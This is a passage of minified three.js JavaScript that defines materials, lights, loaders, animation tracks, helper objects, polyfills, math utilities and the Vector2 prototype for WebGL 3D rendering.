n=c+k/b*d;t.x=a*Math.cos(n);t.y=a*Math.sin(n);f.push(t.x,t.y,t.z);g.push(0,0,1);p.x=(f[m]/a+1)/2;p.y=(f[m+1]/a+1)/2;h.push(p.x,p.y)}for(m=1;m<=b;m++)e.push(m,m+1,0);this.setIndex(e);this.addAttribute(\"position\",new z(f,3));this.addAttribute(\"normal\",new z(g,3));this.addAttribute(\"uv\",new z(h,2))}function bc(){Ha.call(this,{uniforms:Ja.merge([V.lights,\n{opacity:{value:1}}]),vertexShader:Z.shadow_vert,fragmentShader:Z.shadow_frag});this.transparent=this.lights=!0;Object.defineProperties(this,{opacity:{enumerable:!0,get:function(){return this.uniforms.opacity.value},set:function(a){this.uniforms.opacity.value=a}}})}function cc(a){Ha.call(this,a);this.type=\"RawShaderMaterial\"}function Xc(a){this.uuid=N.generateUUID();this.type=\"MultiMaterial\";this.materials=Array.isArray(a)?a:[];this.visible=!0}function Qa(a){X.call(this);this.defines={STANDARD:\"\"};\nthis.type=\"MeshStandardMaterial\";this.color=new J(16777215);this.metalness=this.roughness=.5;this.lightMap=this.map=null;this.lightMapIntensity=1;this.aoMap=null;this.aoMapIntensity=1;this.emissive=new J(0);this.emissiveIntensity=1;this.bumpMap=this.emissiveMap=null;this.bumpScale=1;this.normalMap=null;this.normalScale=new D(1,1);this.displacementMap=null;this.displacementScale=1;this.displacementBias=0;this.envMap=this.alphaMap=this.metalnessMap=this.roughnessMap=null;this.envMapIntensity=1;this.refractionRatio=\n.98;this.wireframe=!1;this.wireframeLinewidth=1;this.wireframeLinejoin=this.wireframeLinecap=\"round\";this.morphNormals=this.morphTargets=this.skinning=!1;this.setValues(a)}function rb(a){Qa.call(this);this.defines={PHYSICAL:\"\"};this.type=\"MeshPhysicalMaterial\";this.reflectivity=.5;this.clearCoatRoughness=this.clearCoat=0;this.setValues(a)}function Ca(a){X.call(this);this.type=\"MeshPhongMaterial\";this.color=new J(16777215);this.specular=new J(1118481);this.shininess=30;this.lightMap=this.map=null;\nthis.lightMapIntensity=1;this.aoMap=null;this.aoMapIntensity=1;this.emissive=new J(0);this.emissiveIntensity=1;this.bumpMap=this.emissiveMap=null;this.bumpScale=1;this.normalMap=null;this.normalScale=new D(1,1);this.displacementMap=null;this.displacementScale=1;this.displacementBias=0;this.envMap=this.alphaMap=this.specularMap=null;this.combine=0;this.reflectivity=1;this.refractionRatio=.98;this.wireframe=!1;this.wireframeLinewidth=1;this.wireframeLinejoin=this.wireframeLinecap=\"round\";this.morphNormals=\nthis.morphTargets=this.skinning=!1;this.setValues(a)}function sb(a){Ca.call(this);this.defines={TOON:\"\"};this.type=\"MeshToonMaterial\";this.gradientMap=null;this.setValues(a)}function tb(a){X.call(this,a);this.type=\"MeshNormalMaterial\";this.bumpMap=null;this.bumpScale=1;this.normalMap=null;this.normalScale=new D(1,1);this.displacementMap=null;this.displacementScale=1;this.displacementBias=0;this.wireframe=!1;this.wireframeLinewidth=1;this.morphNormals=this.morphTargets=this.skinning=this.lights=this.fog=\n!1;this.setValues(a)}function ub(a){X.call(this);this.type=\"MeshLambertMaterial\";this.color=new J(16777215);this.lightMap=this.map=null;this.lightMapIntensity=1;this.aoMap=null;this.aoMapIntensity=1;this.emissive=new J(0);this.emissiveIntensity=1;this.envMap=this.alphaMap=this.specularMap=this.emissiveMap=null;this.combine=0;this.reflectivity=1;this.refractionRatio=.98;this.wireframe=!1;this.wireframeLinewidth=1;this.wireframeLinejoin=this.wireframeLinecap=\"round\";this.morphNormals=this.morphTargets=\nthis.skinning=!1;this.setValues(a)}function vb(a){X.call(this);this.type=\"LineDashedMaterial\";this.color=new J(16777215);this.scale=this.linewidth=1;this.dashSize=3;this.gapSize=1;this.lights=!1;this.setValues(a)}function $d(a,b,c){var d=this,e=!1,f=0,g=0;this.onStart=void 0;this.onLoad=a;this.onProgress=b;this.onError=c;this.itemStart=function(a){g++;if(!1===e&&void 0!==d.onStart)d.onStart(a,f,g);e=!0};this.itemEnd=function(a){f++;if(void 0!==d.onProgress)d.onProgress(a,f,g);if(f===g&&(e=!1,void 0!==\nd.onLoad))d.onLoad()};this.itemError=function(a){if(void 0!==d.onError)d.onError(a)}}function sa(a){this.manager=void 0!==a?a:ta}function Re(a){this.manager=void 0!==a?a:ta;this._parser=null}function ae(a){this.manager=void 0!==a?a:ta;this._parser=null}function Yc(a){this.manager=void 0!==a?a:ta}function be(a){this.manager=void 0!==a?a:ta}function td(a){this.manager=void 0!==a?a:ta}function ma(a,b){x.call(this);this.type=\"Light\";this.color=new J(a);this.intensity=void 0!==b?b:1;this.receiveShadow=\nvoid 0}function ud(a,b,c){ma.call(this,a,c);this.type=\"HemisphereLight\";this.castShadow=void 0;this.position.copy(x.DefaultUp);this.updateMatrix();this.groundColor=new J(b)}function wb(a){this.camera=a;this.bias=0;this.radius=1;this.mapSize=new D(512,512);this.map=null;this.matrix=new S}function vd(){wb.call(this,new Fa(50,1,.5,500))}function wd(a,b,c,d,e,f){ma.call(this,a,b);this.type=\"SpotLight\";this.position.copy(x.DefaultUp);this.updateMatrix();this.target=new x;Object.defineProperty(this,\"power\",\n{get:function(){return this.intensity*Math.PI},set:function(a){this.intensity=a/Math.PI}});this.distance=void 0!==c?c:0;this.angle=void 0!==d?d:Math.PI/3;this.penumbra=void 0!==e?e:0;this.decay=void 0!==f?f:1;this.shadow=new vd}function xd(a,b,c,d){ma.call(this,a,b);this.type=\"PointLight\";Object.defineProperty(this,\"power\",{get:function(){return 4*this.intensity*Math.PI},set:function(a){this.intensity=a/(4*Math.PI)}});this.distance=void 0!==c?c:0;this.decay=void 0!==d?d:1;this.shadow=new wb(new Fa(90,\n1,.5,500))}function yd(){wb.call(this,new Jb(-5,5,5,-5,.5,500))}function zd(a,b){ma.call(this,a,b);this.type=\"DirectionalLight\";this.position.copy(x.DefaultUp);this.updateMatrix();this.target=new x;this.shadow=new yd}function Ad(a,b){ma.call(this,a,b);this.type=\"AmbientLight\";this.castShadow=void 0}function xa(a,b,c,d){this.parameterPositions=a;this._cachedIndex=0;this.resultBuffer=void 0!==d?d:new b.constructor(c);this.sampleValues=b;this.valueSize=c}function Bd(a,b,c,d){xa.call(this,a,b,c,d);this._offsetNext=\nthis._weightNext=this._offsetPrev=this._weightPrev=-0}function Zc(a,b,c,d){xa.call(this,a,b,c,d)}function Cd(a,b,c,d){xa.call(this,a,b,c,d)}function xb(a,b,c,d){if(void 0===a)throw Error(\"track name is undefined\");if(void 0===b||0===b.length)throw Error(\"no keyframes in track named \"+a);this.name=a;this.times=na.convertArray(b,this.TimeBufferType);this.values=na.convertArray(c,this.ValueBufferType);this.setInterpolation(d||this.DefaultInterpolation);this.validate();this.optimize()}function dc(a,b,\nc,d){xb.call(this,a,b,c,d)}function Dd(a,b,c,d){xa.call(this,a,b,c,d)}function $c(a,b,c,d){xb.call(this,a,b,c,d)}function ec(a,b,c,d){xb.call(this,a,b,c,d)}function Ed(a,b,c,d){xb.call(this,a,b,c,d)}function Fd(a,b,c){xb.call(this,a,b,c)}function Gd(a,b,c,d){xb.call(this,a,b,c,d)}function yb(a,b,c,d){xb.apply(this,arguments)}function qa(a,b,c){this.name=a;this.tracks=c;this.duration=void 0!==b?b:-1;this.uuid=N.generateUUID();0>this.duration&&this.resetDuration();this.optimize()}function Hd(a){this.manager=\nvoid 0!==a?a:ta;this.textures={}}function ce(a){this.manager=void 0!==a?a:ta}function zb(){this.onLoadStart=function(){};this.onLoadProgress=function(){};this.onLoadComplete=function(){}}function de(a){\"boolean\"===typeof a&&(console.warn(\"THREE.JSONLoader: showStatus parameter has been removed from constructor.\"),a=void 0);this.manager=void 0!==a?a:ta;this.withCredentials=!1}function Se(a){this.manager=void 0!==a?a:ta;this.texturePath=\"\"}function Te(a,b,c,d,e){b=.5*(d-b);e=.5*(e-c);var f=a*a;return(2*\nc-2*d+b+e)*a*f+(-3*c+3*d-2*b-e)*f+b*a+c}function Ab(a,b,c,d){var e=1-a;return e*e*b+2*(1-a)*a*c+a*a*d}function Bb(a,b,c,d,e){var f=1-a,g=1-a;return f*f*f*b+3*g*g*a*c+3*(1-a)*a*a*d+a*a*a*e}function ua(){}function Ta(a,b){this.v1=a;this.v2=b}function ad(){this.curves=[];this.autoClose=!1}function Wa(a,b,c,d,e,f,g,h){this.aX=a;this.aY=b;this.xRadius=c;this.yRadius=d;this.aStartAngle=e;this.aEndAngle=f;this.aClockwise=g;this.aRotation=h||0}function Cb(a){this.points=void 0===a?[]:a}function fc(a,b,c,\nd){this.v0=a;this.v1=b;this.v2=c;this.v3=d}function gc(a,b,c){this.v0=a;this.v1=b;this.v2=c}function bd(a){ad.call(this);this.currentPoint=new D;a&&this.fromPoints(a)}function Db(){bd.apply(this,arguments);this.holes=[]}function ee(){this.subPaths=[];this.currentPath=null}function fe(a){this.data=a}function Ue(a){this.manager=void 0!==a?a:ta}function ge(a){this.manager=void 0!==a?a:ta}function he(a,b,c,d){ma.call(this,a,b);this.type=\"RectAreaLight\";this.position.set(0,1,0);this.updateMatrix();this.width=\nvoid 0!==c?c:10;this.height=void 0!==d?d:10}function Ve(){this.type=\"StereoCamera\";this.aspect=1;this.eyeSep=.064;this.cameraL=new Fa;this.cameraL.layers.enable(1);this.cameraL.matrixAutoUpdate=!1;this.cameraR=new Fa;this.cameraR.layers.enable(2);this.cameraR.matrixAutoUpdate=!1}function Id(a,b,c){x.call(this);this.type=\"CubeCamera\";var d=new Fa(90,1,a,b);d.up.set(0,-1,0);d.lookAt(new q(1,0,0));this.add(d);var e=new Fa(90,1,a,b);e.up.set(0,-1,0);e.lookAt(new q(-1,0,0));this.add(e);var f=new Fa(90,\n1,a,b);f.up.set(0,0,1);f.lookAt(new q(0,1,0));this.add(f);var g=new Fa(90,1,a,b);g.up.set(0,0,-1);g.lookAt(new q(0,-1,0));this.add(g);var h=new Fa(90,1,a,b);h.up.set(0,-1,0);h.lookAt(new q(0,0,1));this.add(h);var m=new Fa(90,1,a,b);m.up.set(0,-1,0);m.lookAt(new q(0,0,-1));this.add(m);this.renderTarget=new Gb(c,c,{format:1022,magFilter:1006,minFilter:1006});this.updateCubeMap=function(a,b){null===this.parent&&this.updateMatrixWorld();var c=this.renderTarget,n=c.texture.generateMipmaps;c.texture.generateMipmaps=\n!1;c.activeCubeFace=0;a.render(b,d,c);c.activeCubeFace=1;a.render(b,e,c);c.activeCubeFace=2;a.render(b,f,c);c.activeCubeFace=3;a.render(b,g,c);c.activeCubeFace=4;a.render(b,h,c);c.texture.generateMipmaps=n;c.activeCubeFace=5;a.render(b,m,c);a.setRenderTarget(null)}}function ie(){x.call(this);this.type=\"AudioListener\";this.context=je.getContext();this.gain=this.context.createGain();this.gain.connect(this.context.destination);this.filter=null}function hc(a){x.call(this);this.type=\"Audio\";this.context=\na.context;this.gain=this.context.createGain();this.gain.connect(a.getInput());this.autoplay=!1;this.buffer=null;this.loop=!1;this.startTime=0;this.playbackRate=1;this.isPlaying=!1;this.hasPlaybackControl=!0;this.sourceType=\"empty\";this.filters=[]}function ke(a){hc.call(this,a);this.panner=this.context.createPanner();this.panner.connect(this.gain)}function le(a,b){this.analyser=a.context.createAnalyser();this.analyser.fftSize=void 0!==b?b:2048;this.data=new Uint8Array(this.analyser.frequencyBinCount);\na.getOutput().connect(this.analyser)}function Jd(a,b,c){this.binding=a;this.valueSize=c;a=Float64Array;switch(b){case \"quaternion\":b=this._slerp;break;case \"string\":case \"bool\":a=Array;b=this._select;break;default:b=this._lerp}this.buffer=new a(4*c);this._mixBufferRegion=b;this.referenceCount=this.useCount=this.cumulativeWeight=0}function ka(a,b,c){this.path=b;this.parsedPath=c||ka.parseTrackName(b);this.node=ka.findNode(a,this.parsedPath.nodeName)||a;this.rootNode=a}function me(a){this.uuid=N.generateUUID();\nthis._objects=Array.prototype.slice.call(arguments);this.nCachedObjects_=0;var b={};this._indicesByUUID=b;for(var c=0,d=arguments.length;c!==d;++c)b[arguments[c].uuid]=c;this._paths=[];this._parsedPaths=[];this._bindings=[];this._bindingsIndicesByPath={};var e=this;this.stats={objects:{get total(){return e._objects.length},get inUse(){return this.total-e.nCachedObjects_}},get bindingsPerObject(){return e._bindings.length}}}function ne(a,b,c){this._mixer=a;this._clip=b;this._localRoot=c||null;a=b.tracks;\nb=a.length;c=Array(b);for(var d={endingStart:2400,endingEnd:2400},e=0;e!==b;++e){var f=a[e].createInterpolant(null);c[e]=f;f.settings=d}this._interpolantSettings=d;this._interpolants=c;this._propertyBindings=Array(b);this._weightInterpolant=this._timeScaleInterpolant=this._byClipCacheIndex=this._cacheIndex=null;this.loop=2201;this._loopCount=-1;this._startTime=null;this.time=0;this._effectiveWeight=this.weight=this._effectiveTimeScale=this.timeScale=1;this.repetitions=Infinity;this.paused=!1;this.enabled=\n!0;this.clampWhenFinished=!1;this.zeroSlopeAtEnd=this.zeroSlopeAtStart=!0}function cd(a){this._root=a;this._initMemoryManager();this.time=this._accuIndex=0;this.timeScale=1}function Kd(a,b){\"string\"===typeof a&&(console.warn(\"THREE.Uniform: Type parameter is no longer needed.\"),a=b);this.value=a}function Eb(){I.call(this);this.type=\"InstancedBufferGeometry\";this.maxInstancedCount=void 0}function oe(a,b,c,d){this.uuid=N.generateUUID();this.data=a;this.itemSize=b;this.offset=c;this.normalized=!0===\nd}function ic(a,b){this.uuid=N.generateUUID();this.array=a;this.stride=b;this.count=void 0!==a?a.length/b:0;this.dynamic=!1;this.updateRange={offset:0,count:-1};this.onUploadCallback=function(){};this.version=0}function jc(a,b,c){ic.call(this,a,b);this.meshPerAttribute=c||1}function kc(a,b,c){U.call(this,a,b);this.meshPerAttribute=c||1}function pe(a,b,c,d){this.ray=new cb(a,b);this.near=c||0;this.far=d||Infinity;this.params={Mesh:{},Line:{},LOD:{},Points:{threshold:1},Sprite:{}};Object.defineProperties(this.params,\n{PointCloud:{get:function(){console.warn(\"THREE.Raycaster: params.PointCloud has been renamed to params.Points.\");return this.Points}}})}function We(a,b){return a.distance-b.distance}function qe(a,b,c,d){if(!1!==a.visible&&(a.raycast(b,c),!0===d)){a=a.children;d=0;for(var e=a.length;d<e;d++)qe(a[d],b,c,!0)}}function re(a){this.autoStart=void 0!==a?a:!0;this.elapsedTime=this.oldTime=this.startTime=0;this.running=!1}function se(a,b,c){this.radius=void 0!==a?a:1;this.phi=void 0!==b?b:0;this.theta=void 0!==\nc?c:0;return this}function te(a,b,c){this.radius=void 0!==a?a:1;this.theta=void 0!==b?b:0;this.y=void 0!==c?c:0;return this}function oa(a,b){Aa.call(this,a,b);this.animationsMap={};this.animationsList=[];var c=this.geometry.morphTargets.length;this.createAnimation(\"__default\",0,c-1,c/1);this.setAnimationWeight(\"__default\",1)}function dd(a){x.call(this);this.material=a;this.render=function(a){}}function ed(a,b,c,d){this.object=a;this.size=void 0!==b?b:1;a=void 0!==c?c:16711680;d=void 0!==d?d:1;b=0;\n(c=this.object.geometry)&&c.isGeometry?b=3*c.faces.length:c&&c.isBufferGeometry&&(b=c.attributes.normal.count);c=new I;b=new z(6*b,3);c.addAttribute(\"position\",b);ga.call(this,c,new ia({color:a,linewidth:d}));this.matrixAutoUpdate=!1;this.update()}function lc(a){x.call(this);this.light=a;this.light.updateMatrixWorld();this.matrix=a.matrixWorld;this.matrixAutoUpdate=!1;a=new I;for(var b=[0,0,0,0,0,1,0,0,0,1,0,1,0,0,0,-1,0,1,0,0,0,0,1,1,0,0,0,0,-1,1],c=0,d=1;32>c;c++,d++){var e=c/32*Math.PI*2,f=d/32*\nMath.PI*2;b.push(Math.cos(e),Math.sin(e),1,Math.cos(f),Math.sin(f),1)}a.addAttribute(\"position\",new z(b,3));b=new ia({fog:!1});this.cone=new ga(a,b);this.add(this.cone);this.update()}function mc(a){this.bones=this.getBoneList(a);for(var b=new I,c=[],d=[],e=new J(0,0,1),f=new J(0,1,0),g=0;g<this.bones.length;g++){var h=this.bones[g];h.parent&&h.parent.isBone&&(c.push(0,0,0),c.push(0,0,0),d.push(e.r,e.g,e.b),d.push(f.r,f.g,f.b))}b.addAttribute(\"position\",new z(c,3));b.addAttribute(\"color\",new z(d,3));\nc=new ia({vertexColors:2,depthTest:!1,depthWrite:!1,transparent:!0});ga.call(this,b,c);this.root=a;this.matrix=a.matrixWorld;this.matrixAutoUpdate=!1;this.update()}function nc(a,b){this.light=a;this.light.updateMatrixWorld();var c=new pb(b,4,2),d=new Ka({wireframe:!0,fog:!1});d.color.copy(this.light.color).multiplyScalar(this.light.intensity);Aa.call(this,c,d);this.matrix=this.light.matrixWorld;this.matrixAutoUpdate=!1}function oc(a){x.call(this);this.light=a;this.light.updateMatrixWorld();var b=\nnew Ka({color:a.color,fog:!1});a=new Ka({color:a.color,fog:!1,wireframe:!0});var c=new I;c.addAttribute(\"position\",new U(new Float32Array(18),3));this.add(new Aa(c,b));this.add(new Aa(c,a));this.update()}function pc(a,b){x.call(this);this.light=a;this.light.updateMatrixWorld();this.matrix=a.matrixWorld;this.matrixAutoUpdate=!1;var c=new ob(b);c.rotateY(.5*Math.PI);var d=new Ka({vertexColors:2,wireframe:!0}),e=c.getAttribute(\"position\"),e=new Float32Array(3*e.count);c.addAttribute(\"color\",new U(e,\n3));this.add(new Aa(c,d));this.update()}function fd(a,b,c,d){a=a||10;b=b||10;c=new J(void 0!==c?c:4473924);d=new J(void 0!==d?d:8947848);var e=b/2,f=a/b,g=a/2;a=[];for(var h=[],m=0,k=0,t=-g;m<=b;m++,t+=f){a.push(-g,0,t,g,0,t);a.push(t,0,-g,t,0,g);var l=m===e?c:d;l.toArray(h,k);k+=3;l.toArray(h,k);k+=3;l.toArray(h,k);k+=3;l.toArray(h,k);k+=3}b=new I;b.addAttribute(\"position\",new z(a,3));b.addAttribute(\"color\",new z(h,3));c=new ia({vertexColors:2});ga.call(this,b,c)}function Ld(a,b,c,d,e,f){a=a||10;\nb=b||16;c=c||8;d=d||64;e=new J(void 0!==e?e:4473924);f=new J(void 0!==f?f:8947848);var g=[],h=[],m,k,t,l,n;for(t=0;t<=b;t++)k=t/b*2*Math.PI,m=Math.sin(k)*a,k=Math.cos(k)*a,g.push(0,0,0),g.push(m,0,k),n=t&1?e:f,h.push(n.r,n.g,n.b),h.push(n.r,n.g,n.b);for(t=0;t<=c;t++)for(n=t&1?e:f,l=a-a/c*t,b=0;b<d;b++)k=b/d*2*Math.PI,m=Math.sin(k)*l,k=Math.cos(k)*l,g.push(m,0,k),h.push(n.r,n.g,n.b),k=(b+1)/d*2*Math.PI,m=Math.sin(k)*l,k=Math.cos(k)*l,g.push(m,0,k),h.push(n.r,n.g,n.b);a=new I;a.addAttribute(\"position\",\nnew z(g,3));a.addAttribute(\"color\",new z(h,3));g=new ia({vertexColors:2});ga.call(this,a,g)}function gd(a,b,c,d){this.object=a;this.size=void 0!==b?b:1;a=void 0!==c?c:16776960;d=void 0!==d?d:1;b=0;(c=this.object.geometry)&&c.isGeometry?b=c.faces.length:console.warn(\"THREE.FaceNormalsHelper: only THREE.Geometry is supported. Use THREE.VertexNormalsHelper, instead.\");c=new I;b=new z(6*b,3);c.addAttribute(\"position\",b);ga.call(this,c,new ia({color:a,linewidth:d}));this.matrixAutoUpdate=!1;this.update()}\nfunction qc(a,b){x.call(this);this.light=a;this.light.updateMatrixWorld();this.matrix=a.matrixWorld;this.matrixAutoUpdate=!1;void 0===b&&(b=1);var c=new I;c.addAttribute(\"position\",new z([-b,b,0,b,b,0,b,-b,0,-b,-b,0,-b,b,0],3));var d=new ia({fog:!1});this.add(new Ua(c,d));c=new I;c.addAttribute(\"position\",new z([0,0,0,0,0,1],3));this.add(new Ua(c,d));this.update()}function hd(a){function b(a,b,d){c(a,d);c(b,d)}function c(a,b){f.push(0,0,0);g.push(b.r,b.g,b.b);void 0===h[a]&&(h[a]=[]);h[a].push(f.length/\n3-1)}var d=new I,e=new ia({color:16777215,vertexColors:1}),f=[],g=[],h={},m=new J(16755200),k=new J(16711680),l=new J(43775),p=new J(16777215),n=new J(3355443);b(\"n1\",\"n2\",m);b(\"n2\",\"n4\",m);b(\"n4\",\"n3\",m);b(\"n3\",\"n1\",m);b(\"f1\",\"f2\",m);b(\"f2\",\"f4\",m);b(\"f4\",\"f3\",m);b(\"f3\",\"f1\",m);b(\"n1\",\"f1\",m);b(\"n2\",\"f2\",m);b(\"n3\",\"f3\",m);b(\"n4\",\"f4\",m);b(\"p\",\"n1\",k);b(\"p\",\"n2\",k);b(\"p\",\"n3\",k);b(\"p\",\"n4\",k);b(\"u1\",\"u2\",l);b(\"u2\",\"u3\",l);b(\"u3\",\"u1\",l);b(\"c\",\"t\",p);b(\"p\",\"c\",n);b(\"cn1\",\"cn2\",n);b(\"cn3\",\"cn4\",n);\nb(\"cf1\",\"cf2\",n);b(\"cf3\",\"cf4\",n);d.addAttribute(\"position\",new z(f,3));d.addAttribute(\"color\",new z(g,3));ga.call(this,d,e);this.camera=a;this.camera.updateProjectionMatrix&&this.camera.updateProjectionMatrix();this.matrix=a.matrixWorld;this.matrixAutoUpdate=!1;this.pointMap=h;this.update()}function rc(a,b){void 0===b&&(b=16776960);var c=new Uint16Array([0,1,1,2,2,3,3,0,4,5,5,6,6,7,7,4,0,4,1,5,2,6,3,7]),d=new Float32Array(24),e=new I;e.setIndex(new U(c,1));e.addAttribute(\"position\",new U(d,3));ga.call(this,\ne,new ia({color:b}));void 0!==a&&this.update(a)}function Fb(a,b,c,d,e,f){x.call(this);void 0===d&&(d=16776960);void 0===c&&(c=1);void 0===e&&(e=.2*c);void 0===f&&(f=.2*e);void 0===Md&&(Md=new I,Md.addAttribute(\"position\",new z([0,0,0,0,1,0],3)),ue=new Va(0,.5,1,5,1),ue.translate(0,-.5,0));this.position.copy(b);this.line=new Ua(Md,new ia({color:d}));this.line.matrixAutoUpdate=!1;this.add(this.line);this.cone=new Aa(ue,new Ka({color:d}));this.cone.matrixAutoUpdate=!1;this.add(this.cone);this.setDirection(a);\nthis.setLength(c,e,f)}function Nd(a){a=a||1;var b=[0,0,0,a,0,0,0,0,0,0,a,0,0,0,0,0,0,a];a=new I;a.addAttribute(\"position\",new z(b,3));a.addAttribute(\"color\",new z([1,0,0,1,.6,0,0,1,0,.6,1,0,0,0,1,0,.6,1],3));b=new ia({vertexColors:2});ga.call(this,a,b)}function ve(){var a=0,b=0,c=0,d=0;return{initCatmullRom:function(e,f,g,h,m){e=m*(g-e);h=m*(h-f);a=f;b=e;c=-3*f+3*g-2*e-h;d=2*f-2*g+e+h},initNonuniformCatmullRom:function(e,f,g,h,m,k,l){e=((f-e)/m-(g-e)/(m+k)+(g-f)/k)*k;h=((g-f)/k-(h-f)/(k+l)+(h-g)/\nl)*k;a=f;b=e;c=-3*f+3*g-2*e-h;d=2*f-2*g+e+h},calc:function(e){var f=e*e;return a+b*e+c*f+d*f*e}}}function va(a){this.points=a||[];this.closed=!1}function id(a,b,c,d){this.v0=a;this.v1=b;this.v2=c;this.v3=d}function jd(a,b,c){this.v0=a;this.v1=b;this.v2=c}function kd(a,b){this.v1=a;this.v2=b}function Od(a,b,c,d,e,f){Wa.call(this,a,b,c,c,d,e,f)}function Xe(a){console.warn(\"THREE.ClosedSplineCurve3 has been deprecated. Use THREE.CatmullRomCurve3 instead.\");va.call(this,a);this.type=\"catmullrom\";this.closed=\n!0}function Ye(a){console.warn(\"THREE.SplineCurve3 has been deprecated. Use THREE.CatmullRomCurve3 instead.\");va.call(this,a);this.type=\"catmullrom\"}function we(a){console.warn(\"THREE.Spline has been removed. Use THREE.CatmullRomCurve3 instead.\");va.call(this,a);this.type=\"catmullrom\"}void 0===Number.EPSILON&&(Number.EPSILON=Math.pow(2,-52));void 0===Math.sign&&(Math.sign=function(a){return 0>a?-1:0<a?1:+a});void 0===Function.prototype.name&&Object.defineProperty(Function.prototype,\"name\",{get:function(){return this.toString().match(/^\\s*function\\s*([^\\(\\s]*)/)[1]}});\nvoid 0===Object.assign&&function(){Object.assign=function(a){if(void 0===a||null===a)throw new TypeError(\"Cannot convert undefined or null to object\");for(var b=Object(a),c=1;c<arguments.length;c++){var d=arguments[c];if(void 0!==d&&null!==d)for(var e in d)Object.prototype.hasOwnProperty.call(d,e)&&(b[e]=d[e])}return b}}();pa.prototype={addEventListener:function(a,b){void 0===this._listeners&&(this._listeners={});var c=this._listeners;void 0===c[a]&&(c[a]=[]);-1===c[a].indexOf(b)&&c[a].push(b)},hasEventListener:function(a,\nb){if(void 0===this._listeners)return!1;var c=this._listeners;return void 0!==c[a]&&-1!==c[a].indexOf(b)},removeEventListener:function(a,b){if(void 0!==this._listeners){var c=this._listeners[a];if(void 0!==c){var d=c.indexOf(b);-1!==d&&c.splice(d,1)}}},dispatchEvent:function(a){if(void 0!==this._listeners){var b=this._listeners[a.type];if(void 0!==b){a.target=this;var c=[],d,e=b.length;for(d=0;d<e;d++)c[d]=b[d];for(d=0;d<e;d++)c[d].call(this,a)}}}};var N={DEG2RAD:Math.PI/180,RAD2DEG:180/Math.PI,generateUUID:function(){var a=\n\"0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz\".split(\"\"),b=Array(36),c=0,d;return function(){for(var e=0;36>e;e++)8===e||13===e||18===e||23===e?b[e]=\"-\":14===e?b[e]=\"4\":(2>=c&&(c=33554432+16777216*Math.random()|0),d=c&15,c>>=4,b[e]=a[19===e?d&3|8:d]);return b.join(\"\")}}(),clamp:function(a,b,c){return Math.max(b,Math.min(c,a))},euclideanModulo:function(a,b){return(a%b+b)%b},mapLinear:function(a,b,c,d,e){return d+(a-b)*(e-d)/(c-b)},lerp:function(a,b,c){return(1-c)*a+c*b},smoothstep:function(a,\nb,c){if(a<=b)return 0;if(a>=c)return 1;a=(a-b)/(c-b);return a*a*(3-2*a)},smootherstep:function(a,b,c){if(a<=b)return 0;if(a>=c)return 1;a=(a-b)/(c-b);return a*a*a*(a*(6*a-15)+10)},randInt:function(a,b){return a+Math.floor(Math.random()*(b-a+1))},randFloat:function(a,b){return a+Math.random()*(b-a)},randFloatSpread:function(a){return a*(.5-Math.random())},degToRad:function(a){return a*N.DEG2RAD},radToDeg:function(a){return a*N.RAD2DEG},isPowerOfTwo:function(a){return 0===(a&a-1)&&0!==a},nearestPowerOfTwo:function(a){return Math.pow(2,\nMath.round(Math.log(a)/Math.LN2))},nextPowerOfTwo:function(a){a--;a|=a>>1;a|=a>>2;a|=a>>4;a|=a>>8;a|=a>>16;a++;return a}};D.prototype={constructor:D,isVector2:!0,get width(){return this.x},set width(a){this.x=a},get height(){return this.y},set height(a){this.y=a},set:function(a,b){this.x=a;this.y=b;return this},setScalar:function(a){this.y=this.x=a;return this},setX:function(a){this.x=a;return this},setY:function(a){this.y=a;return this},setComponent:function(a,b){switch(a){case 0:this.x=b;break;\ncase 1:this.y=b;break;default:throw Error(\"index is out of range: \"+a);}return this},getComponent:function(a){switch(a){case 0:return this.x;case 1:return this.y;default:throw Error(\"index is out of range: \"+a);}},clone:function(){return new this.constructor(this.x,this.y)},copy:function(a){this.x=a.x;this.y=a.y;return this},add:function(a,b){if(void 0!==b)return console.warn(\"THREE.Vector2: .add() now only accepts one argument. Use .addVectors( a, b ) instead.\"),this.addVectors(a,b);this.x+=a.x;\nthis.y+=a.y;return this},addScalar:function(a){this.x+=a;this.y+=a;return this},addVectors:function(a,b){this.x=a.x+b.x;this.y=a.y+b.y;return this},addScaledVector:function(a,b){this.x+=a.x*b;this.y+=a.y*b;return this},sub:function(a,b){if(void 0!==b)return console.warn(\"THREE.Vector2: .sub() now only accepts one argument. Use .subVectors( a, b ) instead.\"),this.subVectors(a,b);this.x-=a.x;this.y-=a.y;return this},subScalar:function(a){this.x-=a;this.y-=a;return this},subVectors:function(a,b){this.x=\na.x-b.x;this.y=a.y-b.y;return this},multiply:function(a){this.x*=a.x;this.y*=a.y;return this},multiplyScalar:function(a){isFinite(a)?(this.x*=a,this.y*=a):this.y=this.x=0;return this},divide:function(a){this.x/=a.x;this.y/=a.y;return this},divideScalar:function(a){return this.multiplyScalar(1/a)},min:function(a){this.x=Math.min(this.x,a.x);this.y=Math.min(this.y,a.y);return this},max:function(a){this.x=Math.max(this.x,a.x);this.y=Math.max(this.y,a.y);return this},clamp:function(a,b){this.x=Math.max(a.x,\nMath.min(b.x,this.x));this.y=Math.max(a.y,Math.min(b.y,this.y));return this},clampScalar:function(){var a,b;return function(c,d){void 0===a&&(a=new D,b=new D);a.set(c,c);b.set(d,d);return this.clamp(a,b)}}(),clampLength:function(a,b){var c=this.length();return this.multiplyScalar(Math.max(a,Math.min(b,c))/c)},floor:function(){this.x=Math.floor(this.x);this.y=Math.floor(this.y);return this},ceil:function(){this.x=Math.ceil(this.x);this.y=Math.ceil(this.y);return this},round:function(){this.x=Math.round(this.x);\nthis.y=Math.round(this.y);return this},roundToZero:function(){this.x=0>this.x?Math.ceil(this.x):Math.floor(this.x);this.y=0>this.y?Math.ceil(this.y):Math.floor(this.y);return this},negate:function(){this.x=-this.x;this.y=-this.y;return this},dot:function(a){return this.x*a.x+this.y*a.y},lengthSq:function(){return this.x*this.x+this.y*this.y},length:function(){return Math.sqrt(this.x*this.x+this.y*this.y)},lengthManhattan:function(){return Math.abs(this.x)+Math.abs(this.y)},normalize:function(){return this.divideScalar(this.length())},\nangle:function(){var a=Math.atan2(this.y,this.x);0>a&&(a+=2*Math.PI);return a},distanceTo:function(a){return Math.sqrt(this.distanceToSquared(a))},distanceToSquared:function(a){var b=this.x-a.x;a=this.y-a.y;return b*b+a*a},distanceToManhattan:function(a){return Math.abs(this.x-a.x)+Math.abs(this.y-a.y)},setLength:function(a){return this.multiplyScalar(a/this.length())},lerp:function(a,b){this.x+=(a.x-this.x)*b;this.y+=(a.y-this.y)*b;return 